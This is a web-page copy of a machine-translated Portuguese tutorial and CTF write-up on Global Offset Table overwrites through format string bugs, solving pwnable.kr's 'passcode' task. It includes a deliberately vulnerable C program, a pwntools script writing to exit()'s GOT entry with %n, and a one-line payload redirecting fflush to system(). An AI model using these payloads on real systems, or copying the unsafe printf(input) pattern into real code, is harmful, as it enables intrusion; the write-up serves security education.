<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üé® ü¶Å üöÜ Solu√ß√£o de um trabalho com pwnable.kr 05 - c√≥digo de acesso. Reescreva a tabela de links de procedimentos atrav√©s da vulnerabilidade de cadeia de formato üñäÔ∏è üîã üêº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Neste artigo, analisaremos: qual √© a tabela global de compensa√ß√µes, a tabela de rela√ß√µes de procedimentos e sua reescrita atrav√©s da vulnerabilidade d...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Solu√ß√£o de um trabalho com pwnable.kr 05 - c√≥digo de acesso. Reescreva a tabela de links de procedimentos atrav√©s da vulnerabilidade de cadeia de formato</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460647/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="imagem"></div><br>  Neste artigo, analisaremos: qual √© a tabela global de compensa√ß√µes, a tabela de rela√ß√µes de procedimentos e sua reescrita atrav√©s da vulnerabilidade da string de formato.  Tamb√©m resolveremos a 5¬™ tarefa no site <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">pwnable.kr</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Informa√ß√µes Organizacionais</b> <div class="spoiler_text">  Especialmente para aqueles que desejam aprender algo novo e se desenvolver em qualquer uma das √°reas de seguran√ßa da informa√ß√£o e da inform√°tica, escreverei e falarei sobre as seguintes categorias: <br><br><ul><li>  PWN; </li><li>  criptografia (criptografia); </li><li>  tecnologias de rede (rede); </li><li>  reverso (engenharia reversa); </li><li>  esteganografia (estegano); </li><li>  pesquisa e explora√ß√£o de vulnerabilidades na WEB. </li></ul><br>  Al√©m disso, compartilharei minha experi√™ncia em an√°lise forense de computadores, an√°lise de malware e firmware, ataques a redes sem fio e redes locais, realiza√ß√£o de protestos e explora√ß√µes por escrito. <br><a name="habracut"></a><br>  Para que voc√™ possa descobrir sobre novos artigos, software e outras informa√ß√µes, criei um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">canal no Telegram</a> e um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">grupo para discutir quaisquer quest√µes</a> no campo da CID.  Al√©m disso, considerarei pessoalmente seus pedidos, perguntas, sugest√µes e recomenda√ß√µes <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">pessoais e responderei a todos</a> . <br><cut></cut><br>  Todas as informa√ß√µes s√£o fornecidas apenas para fins educacionais.  O autor deste documento n√£o se responsabiliza por nenhum dano causado a algu√©m como resultado do uso dos conhecimentos e m√©todos obtidos como resultado do estudo deste documento. <br></div></div><br><h2>  Tabela de deslocamento global e tabela de relacionamento com procedimentos </h2><br>  Bibliotecas vinculadas dinamicamente s√£o carregadas de um arquivo separado na mem√≥ria no momento da inicializa√ß√£o ou no tempo de execu√ß√£o.  E, portanto, seus endere√ßos na mem√≥ria n√£o s√£o fixos para evitar conflitos de mem√≥ria com outras bibliotecas.  Al√©m disso, o mecanismo de seguran√ßa ASLR aleatoriamente o endere√ßo de cada m√≥dulo no momento da inicializa√ß√£o. <br><br>  Global Offset Table (GOT) - Uma tabela de endere√ßos armazenados na se√ß√£o de dados.  √â usado no tempo de execu√ß√£o para procurar endere√ßos de vari√°veis ‚Äã‚Äãglobais que eram desconhecidas no tempo de compila√ß√£o.  Esta tabela est√° na se√ß√£o de dados e n√£o √© usada por todos os processos.  Todos os endere√ßos absolutos mencionados pela se√ß√£o de c√≥digo s√£o armazenados nesta tabela GOT.  A se√ß√£o de c√≥digo usa deslocamentos relativos para acessar esses endere√ßos absolutos.  E assim, o c√≥digo da biblioteca pode ser compartilhado por processos, mesmo se eles forem carregados em diferentes espa√ßos de endere√ßo de mem√≥ria. <br><br>  A Tabela de Liga√ß√£o de Procedimento (PLT) cont√©m o c√≥digo de salto para chamar fun√ß√µes comuns cujos endere√ßos s√£o armazenados no GOT, ou seja, o PLT cont√©m os endere√ßos nos quais os endere√ßos de dados (endere√ßos) do GOT s√£o armazenados. <br><br>  Considere o mecanismo usando um exemplo: <br><br><ol><li>  No c√≥digo do programa, a fun√ß√£o externa printf √© chamada. </li><li>  O fluxo de controle vai para o en√©simo registro no PLT e a transi√ß√£o ocorre em um deslocamento relativo, em vez de um endere√ßo absoluto. </li><li>  Vai para o endere√ßo armazenado no GOT.  O ponteiro de fun√ß√£o armazenado na tabela GOT primeiro aponta de volta para o snippet de c√≥digo PLT. </li><li>  Portanto, se printf estiver sendo chamado pela primeira vez, o conversor de vinculador din√¢mico ser√° chamado para obter o endere√ßo real da fun√ß√£o de destino. </li><li>  O endere√ßo printf √© gravado na tabela GOT e, em seguida, printf √© chamado. </li><li>  Se printf for chamado novamente no c√≥digo, o resolvedor n√£o ser√° mais chamado porque o endere√ßo de printf j√° est√° armazenado no GOT. </li></ol><cut></cut><br><img src="https://habrastorage.org/webt/j4/yh/xf/j4yhxfc-twcuo9m9e5o2nanwoug.png" alt="imagem"><br><br>  Ao usar essa liga√ß√£o atrasada, n√£o s√£o permitidos ponteiros para fun√ß√µes que n√£o s√£o usadas no tempo de execu√ß√£o.  Assim, economiza muito tempo. <br><br>  Para que esse mecanismo funcione, as seguintes se√ß√µes est√£o presentes no arquivo: <br><br><ul><li>  .got - cont√©m entradas para GOT; </li><li>  .lt - cont√©m entradas para PLT; </li><li>  .got.plt - cont√©m os relacionamentos de endere√ßo GOT - PLT; </li><li>  .plt.got - cont√©m os relacionamentos de endere√ßo PLT - GOT. </li></ul><br>  Como a se√ß√£o .got.plt √© uma matriz de ponteiros e √© preenchida durante a execu√ß√£o do programa (ou seja, a grava√ß√£o √© permitida), podemos sobrescrever um deles e controlar o fluxo de execu√ß√£o do programa. <br><br><h2>  Formatar sequ√™ncia </h2><br>  Uma string de formato √© uma string usando especificadores de formato.  O especificador de formato √© indicado pelo s√≠mbolo "%" (para inserir o sinal de porcentagem, use a sequ√™ncia "%%"). <br><br><pre><code class="cpp hljs">pritntf(‚Äúoutput %s <span class="hljs-number"><span class="hljs-number">123</span></span>‚Äù, ‚Äústr‚Äù); output str <span class="hljs-number"><span class="hljs-number">123</span></span></code> </pre> <br>  Os especificadores de formato mais importantes: <br><br><ul><li>  d - n√∫mero decimal assinado, tamanho padr√£o, sizeof (int); </li><li>  x e X s√£o um n√∫mero hexadecimal sem sinal, x usa letras min√∫sculas (abcdef), X mai√∫sculas (ABCDEF), o tamanho padr√£o √© sizeof (int); </li><li>  s - sa√≠da de linha com byte final zero; </li><li>  n √© o n√∫mero de caracteres escritos no momento em que a sequ√™ncia de comandos que cont√©m n apareceu. </li></ul><br><h2>  Por que a vulnerabilidade de string de formato √© poss√≠vel </h2><br>  Essa vulnerabilidade consiste em usar uma das fun√ß√µes de sa√≠da de formato sem especificar um formato (como no exemplo a seguir).  Assim, n√≥s mesmos podemos especificar o formato de sa√≠da, o que leva √† capacidade de ler valores da pilha e, ao especificar um formato especial, gravar na mem√≥ria. <br><cut></cut><br>  Considere a vulnerabilidade no seguinte exemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(){ char input[100]; printf("Start program!!!\n"); printf("Input: "); scanf("%s", &amp;input); printf("\nYour input: "); printf(input); printf("\n"); exit(0); }</span></span></span></span></code> </pre> <br>  Portanto, a pr√≥xima linha n√£o especifica o formato de sa√≠da. <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(input);</code> </pre> <br>  Compile o programa. <br><br><pre> <code class="bash hljs">gcc vuln1.c -o vuln -no-pie</code> </pre> <br>  Vamos examinar os valores na pilha digitando uma linha contendo especificadores de formato. <br><br><img src="https://habrastorage.org/webt/i9/ib/es/i9ibeshbd2zhx5zmza0gxoegc-e.png" alt="imagem"><br><br>  Assim, ao chamar printf (entrada), a seguinte chamada √© acionada: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(‚Äú%p-%p-%p-%p-%p‚Äú);</code> </pre> <br>  Resta entender o que o programa exibe.  A fun√ß√£o printf possui v√°rios argumentos, que s√£o dados para uma sequ√™ncia de formato. <br><br>  Considere um exemplo de uma chamada de fun√ß√£o com os seguintes argumentos: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(‚ÄúNumber - %d, addres - %<span class="hljs-number"><span class="hljs-number">08</span></span>x, <span class="hljs-built_in"><span class="hljs-built_in">string</span></span> - %s‚Äù, a, &amp;b, c);</code> </pre> <br>  Quando essa fun√ß√£o √© chamada, a pilha ter√° a seguinte apar√™ncia. <br><br><img src="https://habrastorage.org/webt/vo/rj/n2/vorjn2194dvix4kr4mmzutja890.png" alt="imagem"><br><br>  Assim, quando um especificador de formato √© detectado, a fun√ß√£o recupera o valor da pilha.  Da mesma forma, uma fun√ß√£o do nosso exemplo recuperar√° 5 valores da pilha. <br><br><img src="https://habrastorage.org/webt/uj/_j/vc/uj_jvcokc0m81teugsjel-ovzsk.png" alt="imagem"><br><br>  Para confirmar o exposto, encontramos nossa string de formato na pilha. <br><br><img src="https://habrastorage.org/webt/tm/og/pm/tmogpmxoiospc4wwcybi3daw-3u.png" alt="imagem"><br><br>  Ao converter valores de uma visualiza√ß√£o hexadecimal, obtemos a sequ√™ncia "% -p% AAAA".  Ou seja, conseguimos obter os valores da pilha. <br><br><h2>  Substituir OBTIDO </h2><br>  Vamos verificar a capacidade de reescrever o GOT atrav√©s da vulnerabilidade de cadeia de formato.  Para fazer isso, vamos fazer um loop em nosso programa reescrevendo o endere√ßo da fun√ß√£o exit () no endere√ßo principal.  Vamos sobrescrever usando pwntools.  Crie o layout inicial e repita a entrada anterior. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = <span class="hljs-string"><span class="hljs-string">"AAAA%p-%p-%p-%p-%p-%p-%p-%p"</span></span> ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/ln/ej/lh/lnejlh85r86iny9le7wepst28mo.png" alt="imagem"><br><br>  Mas, dependendo do tamanho da string inserida, o conte√∫do da pilha ser√° diferente, garantiremos que a carga de entrada sempre contenha o mesmo n√∫mero de caracteres inseridos. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ‚Äù*‚Äù)</code> </pre> <br><img src="https://habrastorage.org/webt/h8/sg/wg/h8sgwghgqjftpqreusafipcpz0s.png" alt="imagem"><br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ‚Äù*‚Äù)</code> </pre> <br><img src="https://habrastorage.org/webt/gj/bw/d-/gjbwd-9aigcck02hc2k9og5nfve.png" alt="imagem"><br><br>  Agora precisamos descobrir o endere√ßo GOT das fun√ß√µes exit () e o endere√ßo da fun√ß√£o principal.  O endere√ßo principal ser√° encontrado usando o gdb. <br><br><img src="https://habrastorage.org/webt/fp/bm/nn/fpbmnn6xs2bquxngua1igncslnm.png" alt="imagem"><br><br>  O endere√ßo GOT de exit () pode ser encontrado usando gdb e objdump. <br><br><img src="https://habrastorage.org/webt/_a/2o/pm/_a2opmke0_snnf_hczyzh0xtl64.png" alt="imagem"><br><br><img src="https://habrastorage.org/webt/qj/dj/yp/qjdjypxsia_iz1clauydnmtwdgy.png" alt="imagem"><br><br><pre> <code class="bash hljs">objdump -R vuln</code> </pre> <br><img src="https://habrastorage.org/webt/sf/of/qo/sfofqo2pj9dyvb57yf9hsdc1uw8.png" alt="imagem"><br><br>  Escreveremos esses endere√ßos em nosso programa. <br><br><pre> <code class="python hljs">main_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span></code> </pre> <br>  Agora voc√™ precisa reescrever o endere√ßo.  Para adicionar √† pilha o endere√ßo da fun√ß√£o exit () e os endere√ßos que est√£o depois, ou seja,  * (exit ()) + 1, etc.  Voc√™ pode adicion√°-lo usando nossa carga. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p-"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br>  Execute e determine qual conta exibe o endere√ßo. <br><br><img src="https://habrastorage.org/webt/_f/pg/cj/_fpgcjghcjfywqnhdh8qd1mc1ak.png" alt="imagem"><br><br>  Esses endere√ßos s√£o exibidos nas posi√ß√µes 14 e 15. Voc√™ pode exibir o valor em uma posi√ß√£o espec√≠fica da seguinte maneira. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%14$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/xl/ss/3u/xlss3uiye9rnbwz9jxmn5skxcry.png" alt="imagem"><br><br>  Reescreveremos o endere√ßo em dois blocos.  Para come√ßar, imprimiremos 4 valores para que nossos endere√ßos estejam nas 2¬™ e 4¬™ posi√ß√µes. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p%14$p%p%15$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/yw/sy/py/ywsypywco_6skjhhsw1qr40bupc.png" alt="imagem"><br><br>  Agora, dividimos o endere√ßo de main () em dois blocos: <br><blockquote>  0x401162 <br><br>  1) 0x62 = 98 (grava√ß√£o em 0x404038) <br>  2) 0x4011 - 0x62 = 16303 (escreva no endere√ßo 0x404039) </blockquote><br><br>  N√≥s os escrevemos da seguinte maneira: <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>)</code> </pre> <br>  C√≥digo completo: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * start_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span> ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>) ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/qi/vg/vr/qivgvrhzkucvpzfs6s-zwftuuhk.png" alt="imagem"><br><br>  Assim, o programa √© reiniciado em vez de terminar.  Reescrevemos o endere√ßo de sa√≠da (). <br><br><h2>  Solu√ß√£o de trabalho com c√≥digo de acesso </h2><br>  Clicamos no primeiro √≠cone com a assinatura da senha e somos informados de que precisamos nos conectar via SSH com a senha de convidado. <br><br><img src="https://habrastorage.org/webt/h2/jc/tj/h2jctjxsee5hardpu6glunfg2fk.png" alt="imagem"><br><br>  Quando conectado, vemos o banner correspondente. <br><br><img src="https://habrastorage.org/webt/-a/me/pp/-ameppolfflavwiv35qbkkgvg-8.png" alt="imagem"><br><br>  Vamos descobrir quais arquivos est√£o no servidor e quais direitos temos. <br><br><pre> <code class="bash hljs">ls -l</code> </pre> <br><img src="https://habrastorage.org/webt/ds/2m/gv/ds2mgvxu30ah53peas04_wypwja.png" alt="imagem"><br><br>  Assim, podemos ler o c√≥digo fonte do programa, pois existe o direito de ler para todos, e executar o programa de senha com os direitos do propriet√°rio (um bit fixo √© definido).  Vamos ver o resultado do c√≥digo. <br><br><img src="https://habrastorage.org/webt/ld/mj/wr/ldmjwru5rsabi6jyr9o8rrbt2ps.png" alt="imagem"><br><br>  Ocorreu um erro na fun√ß√£o login ().  Em scanf (), o segundo argumento √© passado n√£o o endere√ßo da vari√°vel &amp; passcode1, mas a vari√°vel em si, e n√£o inicializada.  Como a vari√°vel ainda n√£o foi inicializada, ela cont√©m o ‚Äúlixo‚Äù n√£o escrito que permaneceu ap√≥s a execu√ß√£o das instru√ß√µes anteriores.  Ou seja, scanf () gravar√° o n√∫mero no endere√ßo, que ser√£o os dados residuais. <br><br><img src="https://habrastorage.org/webt/vt/5m/w4/vt5mw46djsyiiqhn5h7veqoi8b4.png" alt="imagem"><br><br>  Portanto, se antes de chamar a fun√ß√£o de login, podemos controlar essa √°rea de mem√≥ria, podemos escrever qualquer n√∫mero em qualquer endere√ßo (na verdade, altere a l√≥gica do programa). <br><br>  Como a fun√ß√£o login () √© chamada imediatamente ap√≥s a fun√ß√£o welcome (), eles t√™m os mesmos endere√ßos de quadro de pilha. <br><br><img src="https://habrastorage.org/webt/tj/zr/yi/tjzryim0sirg0i4t3agtqk4loty.png" alt="imagem"><br><br>  Vamos verificar se podemos gravar dados no futuro local da senha1.  Abra o programa no gdb e desmonte as fun√ß√µes de login () e welcome ().  Como o scanf possui dois par√¢metros nos dois casos, o endere√ßo da vari√°vel ser√° passado para a fun√ß√£o primeiro.  Assim, o endere√ßo da senha1 √© ebp-0x10 e o nome √© ebp-0x70. <br><br><img src="https://habrastorage.org/webt/qv/sj/li/qvsjliyjrjehr1lmvptgi5piju4.png" alt="imagem"><br><br><img src="https://habrastorage.org/webt/5t/uy/z3/5tuyz3pptyf76e32xe2idow-rnm.png" alt="imagem"><br><br>  Agora, vamos calcular o endere√ßo passcode1 em rela√ß√£o ao nome, desde que o valor ebp seja o mesmo: <br><blockquote>  (&amp; name) - (&amp; passcode1) = (ebp-0x70) - (ebp-0x10) = -96 <br>  &amp; passcode1 == &amp; name + 96 </blockquote>  Ou seja, os √∫ltimos 4 bytes de nome - este √© o ‚Äúlixo‚Äù que atuar√° como o endere√ßo para gravar na fun√ß√£o de login. <br><br>  No artigo, vimos como voc√™ pode alterar a l√≥gica do aplicativo reescrevendo os endere√ßos no GOT.  Vamos fazer aqui tamb√©m.  Como scanf () √© seguido por flush, no endere√ßo desta fun√ß√£o no GOT, escrevemos o endere√ßo da instru√ß√£o para chamar a fun√ß√£o system () para ler o sinalizador. <br><br><img src="https://habrastorage.org/webt/kx/8i/fk/kx8ifk5y4nzodxayzfdr0pyfjaa.png" alt="imagem"><br><br><img src="https://habrastorage.org/webt/hh/2l/sx/hh2lsxqchatzgvyhvzi_xqj8-ac.png" alt="imagem"><br><br><img src="https://habrastorage.org/webt/nc/vd/bw/ncvdbwjevpugfpt62no2jrnbumk.png" alt="imagem"><br><br>  Ou seja, no endere√ßo 0x804a004, voc√™ precisa escrever 0x80485e3 na forma decimal. <br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print('A'*96 + '\x04\xa0\x04\x08' + str(0x080485e3))"</span></span> | ./passcode</code> </pre> <br><img src="https://habrastorage.org/webt/rh/pu/gf/rhpugfjpmu0ykmcgyc_geflsm5s.png" alt="imagem"><br><br>  Como resultado, obtemos 10 pontos, at√© agora esta √© a tarefa mais dif√≠cil. <br><br><img src="https://habrastorage.org/webt/mg/fm/0-/mgfm0-rba6sb8aehxzm583xrrg4.png" alt="imagem"><br><br>  Os arquivos deste artigo est√£o anexados ao <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">canal Telegram</a> .  Vejo voc√™ nos seguintes artigos! <br><br>  Estamos em um canal de telegrama: um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">canal no telegrama</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt460647/">https://habr.com/ru/post/pt460647/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt460635/index.html">CLRium # 6: Simultaneidade e Paralelismo. Dois dias: do processador ao ass√≠ncrono / aguardar</a></li>
<li><a href="../pt460637/index.html">Controle de luz no ZigBee</a></li>
<li><a href="../pt460641/index.html">YouTokenToMe: uma ferramenta para tokeniza√ß√£o r√°pida de texto da equipe VKontakte</a></li>
<li><a href="../pt460643/index.html">Distribui√ß√£o uniforme de pontos em uma esfera</a></li>
<li><a href="../pt460645/index.html">Fazendo o bem fazendo o mal: escrevendo c√≥digo mal com Go, Parte 1</a></li>
<li><a href="../pt460651/index.html">Reuni√£o da Sociedade de Testadores An√¥nimos: TMS, monitoramento, monitoramento, avalia√ß√£o da qualidade da pesquisa e testes iOS nativos</a></li>
<li><a href="../pt460655/index.html">Como quebrei o Telegram</a></li>
<li><a href="../pt460659/index.html">Usando Tubos para Giro</a></li>
<li><a href="../pt460661/index.html">Tudo o que voc√™ precisa saber sobre o Node.js</a></li>
<li><a href="../pt460665/index.html">Rascunho de FAQ: Por que os padr√µes C ++ s√£o lan√ßados a cada tr√™s anos?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>